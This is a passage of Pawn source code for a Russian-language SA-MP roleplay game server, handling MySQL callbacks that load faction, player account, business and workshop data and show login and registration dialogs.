			FracBank[0][fHamc] = 		cache_get_row_int(0,10, DATABASE);
			FracBank[0][fOmc] = 		cache_get_row_int(0,11, DATABASE);
			FracBank[0][fWmc] = 		cache_get_row_int(0,12, DATABASE);
			FracBank[0][fHwmc] = 		cache_get_row_int(0,13, DATABASE);
			FracBank[0][fFsmc] = 		cache_get_row_int(0,14, DATABASE);
			FracBank[0][fPmc] = 		cache_get_row_int(0,15, DATABASE);
			FracBank[0][fMmc] = 		cache_get_row_int(0,16, DATABASE);
			FracBank[0][fVmc] = 		cache_get_row_int(0,17, DATABASE);
			FracBank[0][fBmc] = 		cache_get_row_int(0,18, DATABASE);
			ballashel = 				cache_get_row_int(0,19, DATABASE);
			groovhel = 					cache_get_row_int(0,20, DATABASE);
			vagoshel = 					cache_get_row_int(0,21, DATABASE);
			aztekhel = 					cache_get_row_int(0,22, DATABASE);
			rifahel = 					cache_get_row_int(0,23, DATABASE);
			addd[0] = 					cache_get_row_int(0,24, DATABASE);
			addd[1] = 					cache_get_row_int(0,25, DATABASE);
			addd[2] = 					cache_get_row_int(0,26, DATABASE);
			healpric = 					cache_get_row_int(0,27, DATABASE);
			yakuzahel = 				cache_get_row_int(0,28, DATABASE);
			lcnhel = 					cache_get_row_int(0,29, DATABASE);
			rmhel = 					cache_get_row_int(0,30, DATABASE);
			lsamatbi = 					cache_get_row_int(0,31, DATABASE);
			armmatbi = 					cache_get_row_int(0,32, DATABASE);
			armmatsf = 					cache_get_row_int(0,33, DATABASE);
			ssmcmatbi = 				cache_get_row_int(0,34, DATABASE);
			hamcmatbi = 				cache_get_row_int(0,35, DATABASE);
			omcmatbi = 					cache_get_row_int(0,36, DATABASE);
			wmcmatbi = 					cache_get_row_int(0,37, DATABASE);
			hwmcmatbi = 				cache_get_row_int(0,38, DATABASE);
			fsmcmatbi = 				cache_get_row_int(0,39, DATABASE);
			vmcmatbi = 					cache_get_row_int(0,40, DATABASE);
			pmcmatbi = 					cache_get_row_int(0,41, DATABASE);
			mmcmatbi = 					cache_get_row_int(0,42, DATABASE);
			bmcmatbi = 					cache_get_row_int(0,43, DATABASE);
			rifamatbi = 				cache_get_row_int(0,44, DATABASE);
			ballasmatbi = 				cache_get_row_int(0,45, DATABASE);
			aztekmatbi = 				cache_get_row_int(0,46, DATABASE);
			vagosmatbi = 				cache_get_row_int(0,47, DATABASE);
			groovmatbi = 				cache_get_row_int(0,48, DATABASE);
			lspdmatbi = 				cache_get_row_int(0,49, DATABASE);
			fbimats = 					cache_get_row_int(0,50, DATABASE);
			yakuzamats = 				cache_get_row_int(0,51, DATABASE);
			rmmats = 					cache_get_row_int(0,52, DATABASE);
			lcnmats = 					cache_get_row_int(0,53, DATABASE);
			sfpdmats = 					cache_get_row_int(0,54, DATABASE);
			lvpdmats = 					cache_get_row_int(0,55, DATABASE);
			MafiaBank[0][nLcn] = 		cache_get_row_int(0,56, DATABASE);
			MafiaBank[0][nYakuza] = 	cache_get_row_int(0,57, DATABASE);
			MafiaBank[0][nRm] = 		cache_get_row_int(0,58, DATABASE);
			BestGang =                  cache_get_row_int(0,59, DATABASE);
			slit =                      cache_get_row_int(0,60, DATABASE);
			new strs[32];
			cache_get_row(0, 61, strs, DATABASE, 32);
			sscanf(strs, "p<,>iii", newsZP[1], newsZP[1], newsZP[2]);
			printf("[Загрузка ...] Данные из Others получены!");
			CreateVehicles();
		}
	case 1:
		{
			if(!r) return printf(" [Аукцион] Нет аккаунта. Деньги не были зачислены!");
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = pBank + %i WHERE Name = '%e'",BizzInfo[bizselect[playerid]][bLastStavka],BizzInfo[bizselect[playerid]][bNameStavka]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			printf("Игроку %s были зачислены %i вирт за аукцион",BizzInfo[bizselect[playerid]][bNameStavka],BizzInfo[bizselect[playerid]][bLastStavka]);
		}
	case 2:
		{
			if(!r)
			{
				if(GetPVarInt(playerid, "wrongPass") == 2) return SCM(playerid,COLOR_LIGHTRED," Неверный пароль. Используйте /q для выхода."), Kick(playerid);
				SetPVarInt(playerid, "wrongPass", GetPVarInt(playerid, "wrongPass")+1);
				format(QUERY,256, "{FF6347}Внимание!Вы ввели неверный пароль!\n\tУ вас осталось (%i) попытки\nПосле вы будете на время забанены",3-GetPVarInt(playerid, "wrongPass"));
				ShowPlayerDialog(playerid,1,DIALOG_STYLE_MSGBOX, "Ошибка!",QUERY, "Повтор", "Выйти");
				PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
                printf("Игрок %s ввёл неверный пароль",Name(playerid));
				return true;
			}
			DeletePVar(playerid,"time_logged");

			PlayerInfo[playerid][pLevel] = 			cache_get_field_content_int(0,"pLevel");
			PlayerInfo[playerid][pHelper] = 		cache_get_field_content_int(0,"pHelper");
			PlayerInfo[playerid][pRatingSupport] = cache_get_field_content_int(0, "pRatingSupport");
			PlayerInfo[playerid][pJobHeal] =		cache_get_field_content_int(0,"pJobHeal");
			PlayerInfo[playerid][pMestoJail] = 		cache_get_field_content_int(0,"pMestoJail");
			cache_get_field_content(0,	"pIp", 		PlayerInfo[playerid][pIp],DATABASE,128);
			cache_get_field_content(0,	"pvIp", 	PlayerInfo[playerid][pvIp],DATABASE,128);
			cache_get_field_content(0,	"pIpReg", 	PlayerInfo[playerid][pIpReg],DATABASE,128);
			PlayerInfo[playerid][pHousecash] = 		cache_get_field_content_int(0,"pHousecash");
			PlayerInfo[playerid][pCheckip] = 		cache_get_field_content_int(0,"pCheckip");
			PlayerInfo[playerid][pGoogleIP] =        cache_get_field_content_int(0,"pGoogleIP");
			PlayerInfo[playerid][pText] = 			cache_get_field_content_int(0,"pText");
			cache_get_field_content(0,	"pKeyip", 	PlayerInfo[playerid][pKeyip],DATABASE,128);
			PlayerInfo[playerid][pHP] = 			cache_get_field_content_float(0,"pHP");
			PlayerInfo[playerid][pSatiety] = 		cache_get_field_content_int(0,"pSatiety");
			cache_get_field_content(0,	"pDataReg", PlayerInfo[playerid][pDataReg],DATABASE,128);
			PlayerInfo[playerid][pDonateRank] = 	cache_get_field_content_int(0,"pDonateRank");
			PlayerInfo[playerid][pMats] = 			cache_get_field_content_int(0,"pMats");
			PlayerInfo[playerid][pSex] = 			cache_get_field_content_int(0,"pSex");
			PlayerInfo[playerid][pArrested] = 		cache_get_field_content_int(0,"pArrested");
			PlayerInfo[playerid][pMuted] = 			cache_get_field_content_int(0,"pMuted");
			PlayerInfo[playerid][pCrimes] = 		cache_get_field_content_int(0,"pCrimes");
			PlayerInfo[playerid][pExp] = 			cache_get_field_content_int(0,"pExp");
			PlayerInfo[playerid][pCash] = 			cache_get_field_content_int(0,"pCash");
			PlayerInfo[playerid][pPHouseKey] = 			cache_get_field_content_int(0,"pPHouseKey");
			PlayerInfo[playerid][pKvartiraKey] = 			cache_get_field_content_int(0,"pKvartiraKey");
			//PlayerInfo[playerid][pAdmin] = 			cache_get_field_content_int(0,"pAdmin");
			PlayerInfo[playerid][pChar][0] = 			cache_get_field_content_int(0,"pChar");
			PlayerInfo[playerid][pPBizzKey] = 			cache_get_field_content_int(0,"pPBizzKey");
			PlayerInfo[playerid][pPFarmKey] = 			cache_get_field_content_int(0,"pPFarmKey");
			PlayerInfo[playerid][pPLimitBank] = 			cache_get_field_content_int(0,"pPLimitBank");
			PlayerInfo[playerid][pWantedDeaths] = 	cache_get_field_content_int(0,"pWantedDeaths");
			PlayerInfo[playerid][pPayCheck] = 		cache_get_field_content_int(0,"pPayCheck");
			PlayerInfo[playerid][pJailTime] =		cache_get_field_content_int(0,"pJailTime");
			PlayerInfo[playerid][pDrugs] =			cache_get_field_content_int(0,"pDrugs");
			PlayerInfo[playerid][pLeader] =			cache_get_field_content_int(0,"pLeader");
			PlayerInfo[playerid][pMember] =			cache_get_field_content_int(0,"pMember");
			PlayerInfo[playerid][pRank] =			cache_get_field_content_int(0,"pRank");
			PlayerInfo[playerid][pJob] =			cache_get_field_content_int(0,"pJob");
			PlayerInfo[playerid][pModel] =			cache_get_field_content_int(0,"pModel");
			PlayerInfo[playerid][pPnumber] =		cache_get_field_content_int(0,"pPnumber");
			PlayerInfo[playerid][pDirectory] =		cache_get_field_content_int(0,"pDirectory");
			PlayerInfo[playerid][pVhoddata] =		cache_get_field_content_int(0,"pVhoddata");
			PlayerInfo[playerid][pVhodMes] =		cache_get_field_content_int(0,"pVhodMes");
			PlayerInfo[playerid][pVhodchas] =		cache_get_field_content_int(0,"pVhodchas");
			PlayerInfo[playerid][pVhodminute] =		cache_get_field_content_int(0,"pVhodminute");
			PlayerInfo[playerid][pCarLic] =			cache_get_field_content_int(0,"pCarLic");
			PlayerInfo[playerid][pFlyLic] =			cache_get_field_content_int(0,"pFlyLic");
			PlayerInfo[playerid][pBoatLic] =		cache_get_field_content_int(0,"pBoatLic");
			PlayerInfo[playerid][pFishLic] =		cache_get_field_content_int(0,"pFishLic");
			PlayerInfo[playerid][pGunLic] =			cache_get_field_content_int(0,"pGunLic");
			PlayerInfo[playerid][pBizLic] =			cache_get_field_content_int(0,"pBizLic");
			PlayerInfo[playerid][pZakonp] =			cache_get_field_content_int(0,"pZakonp");
			PlayerInfo[playerid][pAddiction] =		cache_get_field_content_int(0,"pAddiction");
			PlayerInfo[playerid][pNarcoLomka] =		cache_get_field_content_int(0,"pNarcoLomka");
			PlayerInfo[playerid][pPayDayHad] =		cache_get_field_content_int(0,"pPayDayHad");
			PlayerInfo[playerid][pTut] =			cache_get_field_content_int(0,"pTut");
			PlayerInfo[playerid][pWarns] =			cache_get_field_content_int(0,"pWarns");
			cache_get_field_content(0,"OffWarns", PlayerInfo[playerid][OffWarns],DATABASE,128);
			PlayerInfo[playerid][punWarns] =		cache_get_field_content_int(0,"punWarns");
			PlayerInfo[playerid][pFuel] =			cache_get_field_content_int(0,"pFuel");
			cache_get_field_content(0,"pMarriedTo", PlayerInfo[playerid][pMarriedTo],DATABASE,128);
			cache_get_field_content(0,	"pDrug", 	PlayerInfo[playerid][pDrug],DATABASE,128);
			PlayerInfo[playerid][pMushrooms] =		cache_get_field_content_int(0,"pMushrooms");
			PlayerInfo[playerid][pFishes] =			cache_get_field_content_float(0,"pFishes");
			PlayerInfo[playerid][pBank] =			cache_get_field_content_int(0,"pBank");
			PlayerInfo[playerid][pMobile] =			cache_get_field_content_int(0,"pMobile");
			PlayerInfo[playerid][pDolg] =			cache_get_field_content_int(0,"pDolg");
			PlayerInfo[playerid][pKrisha] =			cache_get_field_content_int(0,"pKrisha");
			PlayerInfo[playerid][pUseKrisha] =		cache_get_field_content_int(0,"pUseKrisha");
			PlayerInfo[playerid][pWantedLevel] =	cache_get_field_content_int(0,"pWantedLevel");
			cache_get_field_content(0,	"pWeapons", PlayerInfo[playerid][pWeapons],DATABASE,32);
			cache_get_field_content(0,	"pAmmos", 	PlayerInfo[playerid][pAmmos],DATABASE,32);
			sscanf(PlayerInfo[playerid][pWeapons], "p<,>a<i>[11]",PlayerInfo[playerid][pWeapon]);
			sscanf(PlayerInfo[playerid][pAmmos], "p<,>a<i>[11]",PlayerInfo[playerid][pAmmo]);
			cache_get_field_content(0,	"pGunSkills", PlayerInfo[playerid][pGunSkills],DATABASE,32);
			sscanf(PlayerInfo[playerid][pGunSkills], "p<,>a<i>[6]",PlayerInfo[playerid][pGunSkill]);
			PlayerInfo[playerid][ptaxiexp] =		cache_get_field_content_int(0,"ptaxiexp");
			PlayerInfo[playerid][pQuestL] =		cache_get_field_content_int(0,"pQuestL");
			PlayerInfo[playerid][pQuest] =		cache_get_field_content_int(0,"pQuest");
			PlayerInfo[playerid][pQuestF] =		cache_get_field_content_int(0,"pQuestF");
			PlayerInfo[playerid][pQuestP] =		cache_get_field_content_int(0,"pQuestP");
			PlayerInfo[playerid][pQuestPF] =		cache_get_field_content_int(0,"pQuestPF");
			PlayerInfo[playerid][pQuestShow] =		cache_get_field_content_int(0,"pQuestShow");
			PlayerInfo[playerid][ptaxilvl] =		cache_get_field_content_int(0,"ptaxilvl");
			PlayerInfo[playerid][pTraining] =		cache_get_field_content_int(0,"pTraining");
			PlayerInfo[playerid][pBoxSkill] =		cache_get_field_content_int(0,"pBoxSkill");
			PlayerInfo[playerid][pKongfuSkill] =	cache_get_field_content_int(0,"pKongfuSkill");
			PlayerInfo[playerid][pKickboxSkill] =	cache_get_field_content_int(0,"pKickboxSkill");
			PlayerInfo[playerid][pDLevel] =			cache_get_field_content_int(0,"pDLevel");
			PlayerInfo[playerid][pDExp] =			cache_get_field_content_int(0,"pDExp");
			PlayerInfo[playerid][pDMgruz] =			cache_get_field_content_int(0,"pDMgruz");
			PlayerInfo[playerid][pPSkill] =			cache_get_field_content_int(0,"pPSkill");
			PlayerInfo[playerid][pPProc] =			cache_get_field_content_int(0,"pPProc");
			PlayerInfo[playerid][pPMGruz] =			cache_get_field_content_int(0,"pPMGruz");
			cache_get_field_content(0,	"pOnline", 	PlayerInfo[playerid][pOnline],DATABASE,128);
			PlayerInfo[playerid][pChas] =			cache_get_field_content_int(0,"pChas");
			PlayerInfo[playerid][pMin] =			cache_get_field_content_int(0,"pMin");
			cache_get_field_content(0,	"pEmail", 	PlayerInfo[playerid][pEmail],DATABASE,128);
			cache_get_field_content(0,"pOnlineLid", PlayerInfo[playerid][pOnlineLid],DATABASE,128);
			PlayerInfo[playerid][pSkilla] =			cache_get_field_content_int(0,"pSkilla");
			PlayerInfo[playerid][pRecognition] =	cache_get_field_content_int(0,"pRecognition");
			PlayerInfo[playerid][pRobHouse] =		cache_get_field_content_int(0,"pRobHouse");
			PlayerInfo[playerid][pFishesPach] =		cache_get_field_content_int(0,"pFishesPach");
			PlayerInfo[playerid][pActivemail] =		cache_get_field_content_int(0,"activate_mail");
			PlayerInfo[playerid][pDrivingSkill] =	cache_get_field_content_int(0,"pDrivingSkill");
			PlayerInfo[playerid][pDonateAccount] =	cache_get_field_content_int(0,"pDonateAccount");
			PlayerInfo[playerid][pProdsSkill][0] =	cache_get_field_content_int(0,"prods_skill");
			PlayerInfo[playerid][pProdsSkill][1] =	cache_get_field_content_int(0,"prods_exp");
			PlayerInfo[playerid][pDonateMoney] =     cache_get_field_content_int(0,"pDonateMoney");
			new spawns[5];
			cache_get_field_content(0,"pSpawnChange", spawns,DATABASE,128);
			//PlayerInfo[playerid][pSpawnChange] =		cache_get_field_content_int(0,"pSpawnChange");
			PlayerInfo[playerid][pGRating] =         cache_get_field_content_int(0,"grating");
			sscanf(spawns, "p<,>ii", PlayerInfo[playerid][pSpawnChange][0], PlayerInfo[playerid][pSpawnChange][1]);
			new aprogolos = cache_get_field_content_int(0, "progolos");
			if(aprogolos > 0) PlayerInfo[playerid][progolos] = true;
			else PlayerInfo[playerid][progolos] = false;
			cache_get_field_content(0, "pChars", PlayerInfo[playerid][pChars], DATABASE, 32);
			sscanf(PlayerInfo[playerid][pChars], "p<,>a<i>[6]",PlayerInfo[playerid][pChar]);
			if(gettime() >= PlayerInfo[playerid][OffWarns])
			{
				PlayerInfo[playerid][pWarns] = 0;
				PlayerInfo[playerid][OffWarns] = 0;
			}
			/* Загрузка данных */
			HGet(playerid);
			BGet(playerid);
			WGet(playerid);
			KGet(playerid);
			FGet(playerid);
			mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_CARS"` WHERE `owner` = '%s'",PlayerInfo[playerid][pName]), mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",33,playerid,"");
			//
			if(PlayerInfo[playerid][pTut] == 0)
			{
				//PlayerInfo[playerid][pCash] = 0;
				//format(QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '0' WHERE name = '%s'",PlayerInfo[playerid][pName]);
				//mysql_function_query(DATABASE,QUERY,false,"","");
				PlayerInfo[playerid][pPHouseKey] = 9999;
				PlayerInfo[playerid][pKvartiraKey] = 9999;
				PlayerInfo[playerid][pPBizzKey] = 999;
				PlayerInfo[playerid][pPFarmKey] = 999;
				PlayerInfo[playerid][pTut] = 1;
				SaveMySQL(2, playerid);
			}
			PlayerInfo[playerid][pLogin] = 1;
			Convoi[playerid] = 9999;
			// Снятие варнов
			new null = PlayerInfo[playerid][punWarns];
			if(null < Now() && PlayerInfo[playerid][pWarns]) PlayerInfo[playerid][pWarns] = 0, PlayerInfo[playerid][punWarns] = 0;
			//
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pLogin = '1' WHERE name = '%s'", PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			new playersip[40];
			GetPlayerIp(playerid,playersip,sizeof(playersip));
			if(PlayerInfo[playerid][pCheckip] == 1)
			{
				if(strcmp(playersip, PlayerInfo[playerid][pIp]) != 0)
				{
					PlayerInfo[playerid][pLogin] = 0;
					mysql_format(DATABASE, QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pLogin = '0' WHERE name = '%e'",PlayerInfo[playerid][pName]);
					mysql_function_query(DATABASE,QUERY,false,"","");
					SetPlayerInterior(playerid, 0);
					SetPlayerFacingAngle(playerid, 179.5547);
					SetPlayerCameraPos(playerid, 1357.414428,-1450.705322,252.353897);
					SetPlayerCameraLookAt(playerid, 1365.318969,-1445.091796,249.903198);
					TogglePlayerControllable(playerid, 0);
					ShowPlayerDialogEx(playerid,16,DIALOG_STYLE_INPUT, "Введите ключ безопасности", "    ==== Ваш IP адрес сменился ====\n=== Введите Ваш ключ безопасности ===", "Готово", "Отмена");
					return true;
				}
			}
			else
			{
				mysql_format(DATABASE, QUERY, 256, "UPDATE `"TABLE_ACCOUNTS"` SET pIp = '%s',pvIp = '%s' WHERE name = '%e'",playersip,playersip,PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				new year, month, day, hour, minute, second;
				getdate(year, month, day);
				gettime(hour, minute, second);
				mysql_format(DATABASE,QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pLogin = '1', pOnline = '%04i/%02i/%02i %02i:%02i:%02i' WHERE name = '%e'", year, month, day, hour, minute, second, PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
			}
			/**/
			//if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] != 0 && !IsAGang(playerid) && !IsAMafia(playerid) && !IsABiker(playerid)) PlayerInfo[playerid][pSpawnChange] = 1;
			if(PlayerInfo[playerid][pCash] < 0) PlayerInfo[playerid][pCash] = 0;
			for(new c = 0; c < 5; c++) if(CarInfo[playerid][carPercent][c] <= 3 && CarInfo[playerid][carModel][c] != 462) CarInfo[playerid][carPercent][c] = 4;
			if(PlayerInfo[playerid][pDonateRank] > 0) SCM(playerid, 0xEAC700AA, " Здравствуйте VIP игрок!");
			format(QUERY, 40, "~w~Welcome ~n~~b~   %s", PlayerInfo[playerid][pName]);
			GameTextForPlayer(playerid, QUERY, 1000, 1);
			if(!PlayerInfo[playerid][pActivemail]) SCM(playerid,-1,"{FFFFFF} У вас не подтвержден Эмейл адрес! Используйте {FFFF00}/mm{FFFFFF} -> Настройки -> Эмейл");
			if(!PlayerInfo[playerid][pActivemail]) SCM(playerid,-1,"{FFFFFF} Обратите внимание! В случае утери пароля, вы не сможете восстановить доступ с неподтвержденным Эмейл адресом");
			if (PlayerInfo[playerid][pText] == 10) SCM(playerid, COLOR_YELLOW, " Ваш ранг был изменён"),PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 9) SCM(playerid, COLOR_YELLOW, " Вас выгнали из организации"),PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 8) SCM(playerid, COLOR_LIGHTRED, " Вам было начислено 2 500 000 вирт за победу в рейтинге банд!"), PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 7) format(YCMDstr, sizeof(YCMDstr), " Вы были посажены в форт ДеМорган в оффлайн режиме администратором %s", NameServer), SCM(playerid, COLOR_LIGHTRED, YCMDstr), PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 6) SCM(playerid, -1, " Вы приобрели бизнес с аукциона. Управление:{FFFF00} /mm - [3] Команды сервера"), PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 4) SCM(playerid, -1, " Вы сняты с поста лидера оффлайн"), PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 5) SCM(playerid, -1, " Ваша автомастерская была продана государству. Половина стоимости зачислена на ваш счет"), PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 3) PlayerInfo[playerid][pText] = 0, SCM(playerid, COLOR_GOLD, " Вы получили 100 000 вирт на банковский счет, за приглашённого друга"), PlayerInfo[playerid][pText] = 0;
			if (PlayerInfo[playerid][pText] == 1 && PlayerInfo[playerid][pHousecash] !=0) SCM(playerid, COLOR_LIGHTRED, " Вы были выселены за неуплату квартплаты"), SCM(playerid, COLOR_LIGHTRED, " Деньги за дом вы можете получить в банке \"/GetHouseMoney\""),PlayerInfo[playerid][pPHouseKey] = 9999;
			if (!HGet(playerid) && PlayerInfo[playerid][pPHouseKey] !=9999) SCM(playerid, COLOR_LIGHTRED, " Вы были выселены за неуплату квартплаты"), SCM(playerid, COLOR_LIGHTRED, " Деньги за дом вы можете получить в банке \"/GetHouseMoney\""),PlayerInfo[playerid][pPHouseKey] = 9999;
			if (PlayerInfo[playerid][pText] == 2) SCM(playerid, COLOR_YELLOW, " Ваш бизнес был продан за неуплату электроэнергии / простаивание"), PlayerInfo[playerid][pText] = 0;
			if(ZoneID != 0) GangZoneShowForAll(ZoneWar, 0xB2B2B2AA), GangZoneFlashForAll(ZoneWar,COLOR_RED);
			PEfir[playerid] = 255;
			Pefir[playerid] = 999;
			ac_TogglePlayerSpectating(playerid, 0);
			SpawnPlayer(playerid);
			for(new i = 1; i <= TOTALGZ; i++)
			{
				if(!ZoneOnBattle[i]) continue;
				GangZoneStopFlashForAll(GZInfo[i][gZone]);
				GangZoneFlashForAll(GZInfo[i][gZone],COLOR_RED);
			}
			GangZoneShowForPlayer(playerid, Army, COLOR_YELLOW2);
			SetPlayerHealthAC(playerid, PlayerInfo[playerid][pHP]);
			ResetPlayerMoney(playerid);
			printf("Игрок %s авторизовался",PlayerInfo[playerid][pName]);
		}
	case 3:
		{
			strmid(PlayerInfo[playerid][pDrug], str, 0, strlen(str), strlen(str)+5);
		}
	case 4:
		{
			if(r)
			{
				SCM(playerid, -1,"{C42100} Ваш IP адрес заблокирован");
				return Kick(playerid);
			}
		}
	case 5:
		{
			if(r)
			{
				SCM(playerid, 0xEAC700AA, " Для восстановления доступа нажмите клавишу 'F6' и введите '/restoreAccess'");
  	            format(string, 344, "{FFFFFF}С возращением на сервер {AE433D}%s.\n\n\
					{FFFFFF}Аккаунт c логином {AE433D}%s {FFFFFF}успешно найден.\n\
				    {FFFFFF}Для продолжение, введите ваш пароль от аккаунта.\n\n\
					{FFFFFF}При потери пароля, его можно восстановить на сайте {AE433D}%s\n\n\
					{FFFFFF}На авторизацию даётся 120 секунд!",
				NameServer, PlayerInfo[playerid][pName], NameSite
				);
				ShowPlayerDialogEx(playerid, 1, DIALOG_STYLE_PASSWORD, !"{AE433D}Авторизация | {FFFFFF}Ввод пароля", string, !"Войти", !"Отмена");
				SetPVarInt(playerid,"time_logged",120);
			}
			else
			{
				format(QUERY, 527, "{FFFFFF}Приветствую на сервере {AE433D}%s\n{FFFFFF}Регистрация нового персонажа.\n\n{FFFFFF}Логин: %s\nВведите Пароль:\n\n{FFA500}Примечание:\n{FFA500}- {FFFFFF}Пароль должен состоять от 6-ти до 32-ух символов\n{FFA500}- {FFFFFF}Пароль должен состоять из латинских символов и цифр\n{FFA500}- {FFFFFF}Пароль должен подходить для любого регистра",NameServer, PlayerInfo[playerid][pName]);
				ShowPlayerDialogEx(playerid,2,DIALOG_STYLE_INPUT, "{AE433D}Регистрация | {FFFFFF}Ввод пароля",QUERY, "Далее", "Отмена");
			}
		}
	case 6:
		{
			if(!r) return printf("[Загрузка ...] Данные из Bizz не получены!");
			for(x = 1; x <= r; x++)
			{
				BizzInfo[x][bID] = 				cache_get_row_int(x-1,0, DATABASE);
				cache_get_row(x-1, 1, 			BizzInfo[x][bOwner], DATABASE, 64);
				cache_get_row(x-1, 2, 			BizzInfo[x][bMessage], DATABASE, 128);
				BizzInfo[x][bEntranceX] = 		cache_get_row_float(x-1,3, DATABASE);
				BizzInfo[x][bEntranceY] = 		cache_get_row_float(x-1,4, DATABASE);
				BizzInfo[x][bEntranceZ] = 		cache_get_row_float(x-1,5, DATABASE);
				BizzInfo[x][bExitX] = 			cache_get_row_float(x-1,6, DATABASE);
				BizzInfo[x][bExitY] = 			cache_get_row_float(x-1,7, DATABASE);
				BizzInfo[x][bExitZ] = 			cache_get_row_float(x-1,8, DATABASE);
				BizzInfo[x][bBuyPrice] = 		cache_get_row_int(x-1,9, DATABASE);
				BizzInfo[x][bEntranceCost] = 	cache_get_row_int(x-1,10, DATABASE);
				BizzInfo[x][bTill] = 			cache_get_row_int(x-1,11, DATABASE);
				BizzInfo[x][bLocked] = 			cache_get_row_int(x-1,12, DATABASE);
				BizzInfo[x][bInterior] = 		cache_get_row_int(x-1,13, DATABASE);
				BizzInfo[x][bProducts] = 		cache_get_row_int(x-1,14, DATABASE);
				BizzInfo[x][bPrice] = 			cache_get_row_int(x-1,15, DATABASE);
				BizzInfo[x][bBarX] = 			cache_get_row_float(x-1,16, DATABASE);
				BizzInfo[x][bBarY] = 			cache_get_row_float(x-1,17, DATABASE);
				BizzInfo[x][bBarZ] = 			cache_get_row_float(x-1,18, DATABASE);
				BizzInfo[x][bMafia] = 			cache_get_row_int(x-1,19, DATABASE);
				BizzInfo[x][bType] = 			cache_get_row_int(x-1,20, DATABASE);
				BizzInfo[x][bLockTime] = 		cache_get_row_int(x-1,21, DATABASE);
				BizzInfo[x][bLicense] = 		cache_get_row_int(x-1,22, DATABASE);
				BizzInfo[x][bStavka] = 			cache_get_row_int(x-1,23, DATABASE);
				cache_get_row(x-1, 24, 			BizzInfo[x][bNameStavka], DATABASE, 50);
				BizzInfo[x][bLastStavka] = 		cache_get_row_int(x-1,25, DATABASE);
				BizzInfo[x][bTimeStavka] = 		cache_get_row_int(x-1,26, DATABASE);
				BizzInfo[x][bMinStavka] = 		cache_get_row_int(x-1,27, DATABASE);
				BizzInfo[x][bVirtualWorld] = 	cache_get_row_int(x-1,28, DATABASE);
				BizzInfo[x][bLandTax] =         cache_get_row_int(x-1,29, DATABASE);
				BizzInfo[x][bProdPrice] =       cache_get_row_int(x-1,30, DATABASE);

				if(BizzInfo[x][bType] != 4 && BizzInfo[x][bID] != 47 && BizzInfo[x][bID] != 48)
				{
					BizzInfo[x][bEnterPic] = CreatePickupAC(1318, 23, BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],-1);
					BizzInfo[x][bExitPic] = CreatePickupAC(1318, 23, BizzInfo[x][bExitX], BizzInfo[x][bExitY], BizzInfo[x][bExitZ],BizzInfo[x][bVirtualWorld]);
					if(strcmp(BizzInfo[x][bOwner],"None",true) == 0) format(QUERY, 90, "%s\nПродаётся", BizzInfo[x][bMessage], BizzInfo[x][bBuyPrice]), BizzInfo[x][bLocked] = 1;
					else format(QUERY,128, "%s\nВладелец:\n %s", BizzInfo[x][bMessage], BizzInfo[x][bOwner]);
					BizzInfo[x][bLabel] = CreateDynamic3DTextLabel(QUERY,COLOR_GREEN,BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ]+1,20.0);
				}
				if(BizzInfo[x][bType] == 2) BizzInfo[x][bPickup] = CreatePickupAC(1239, 23, BizzInfo[x][bBarX],BizzInfo[x][bBarY],BizzInfo[x][bBarZ],BizzInfo[x][bVirtualWorld]);
				if(BizzInfo[x][bType] == 4)
				{
					if(strcmp(BizzInfo[x][bOwner],"None",true) == 0) format(QUERY, 90, "%s\nПродаётся", BizzInfo[x][bMessage],BizzInfo[x][bBuyPrice]), BizzInfo[x][bLocked] = 1;
					else format(QUERY,128, "%s\nВладелец:\n%s\nЦена бензина: %i вирт", BizzInfo[x][bMessage], BizzInfo[x][bOwner],BizzInfo[x][bPrice]);
					BizzInfo[x][bLabel] = CreateDynamic3DTextLabel(QUERY,COLOR_GREEN,BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],5.0);
				}
				switch(BizzInfo[x][bType])
				{
				case 1: BizzMaxProds[x] = 5000, BizzLandTax[x] = 200;
				case 2: BizzMaxProds[x] = 3000, BizzLandTax[x] = 200;
				case 3: BizzMaxProds[x] = 2000, BizzLandTax[x] = 300;
				case 4: BizzMaxProds[x] = 20000, BizzLandTax[x] = 100;
				}
				TotalBizz++;
			}
			printf("[Загрузка ...] Данные из Bizz получены! (%i шт.)",TotalBizz);
		}
	case 7:
		{
			if(!r) return printf("[Загрузка ...] Данные из Workshop не получены!");
			for(x = 1; x <= r; x++)
			{
				WorkshopInfo[x][wID] = 			cache_get_row_int(x-1,0, DATABASE);
				cache_get_row(x-1, 1, 			WorkshopInfo[x][wOwner], DATABASE, MAX_PLAYER_NAME);
				WorkshopInfo[x][wEntr][0] = 	cache_get_row_float(x-1,2, DATABASE);
				WorkshopInfo[x][wEntr][1] = 	cache_get_row_float(x-1,3, DATABASE);
				WorkshopInfo[x][wEntr][2] = 	cache_get_row_float(x-1,4, DATABASE);
				WorkshopInfo[x][wExit][0] = 	cache_get_row_float(x-1,5, DATABASE);
				WorkshopInfo[x][wExit][1] = 	cache_get_row_float(x-1,6, DATABASE);
